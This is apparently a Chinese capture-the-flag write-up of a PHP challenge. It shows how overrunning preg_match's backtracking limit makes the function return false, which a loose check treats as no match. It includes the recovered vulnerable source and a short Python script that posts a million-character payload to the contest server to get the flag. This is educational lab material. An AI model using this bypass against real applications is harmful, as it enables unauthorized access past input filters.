web php plus - 2018i春秋圣诞欢乐赛
====

Knowledge
----
这道题用到了一个 PHP 对 reDOS (正则表达式的拒绝服务攻击) 而设定的 `preg_match` 最大递归次数限制。  
因为 `preg_match` 正则匹配的过程，遇到贪婪匹配时，程序会进行递归。然而达到最大深度时， `preg_match` 的递归保险机制会中止正则的匹配，并且返回 `false`，正常情况下 `preg_match` 是否匹配返回的是 `int` 型的 `0` 或 `1`。如果不使用强类型比较的话，`0` 和 `false` 会被等价。  
详细漏洞原理请见：[https://www.freebuf.com/articles/web/190794.html](https://www.freebuf.com/articles/web/190794.html)，在此感谢原文作者。

WriteUp
----
这道题是之前 web php 的加强版，比赛的时候突然加的，可能之前数组绕过的做法并不是作者的本意吧。

1. 由于是加强版，依然是 swp 文件，恢复后发现加了一句判断 `!is_array($greeting)`：
    ```php
    <?php
    function areyouok($greeting){
        return preg_match('/Merry.*Christmas/is',$greeting);
    }

    $greeting=@$_POST['greeting'];
    if(!is_array($greeting)){
        if(!areyouok($greeting)){
            if(strpos($greeting,'Merry Christmas')!==false){
                echo 'Merry Christmas. '.'flag{xxxxxx}';
            }else{
                echo 'Do you know .swp file?';
            }
        }else{
            echo 'Do you know PHP?';
        }
    }
    ?>
    ```
    这不就明摆着让我们另找方法吗？
2. 经过同学的努力寻找，找到了如上面 Knowledge 所解释的漏洞。那么我们很轻松的就可以绕过两个函数。构造 payload：Merry Christmasaaa....aaaa(1000000 个 a)，得到 flag。

Script
----
```python
#!/usr/bin/python3
#coding:utf-8

import requests

r = requests.post('http://106.75.66.87:8888/', data={
    'greeting': 'Merry Christmas' + 'a' * 1000000
})

print(r.text)
```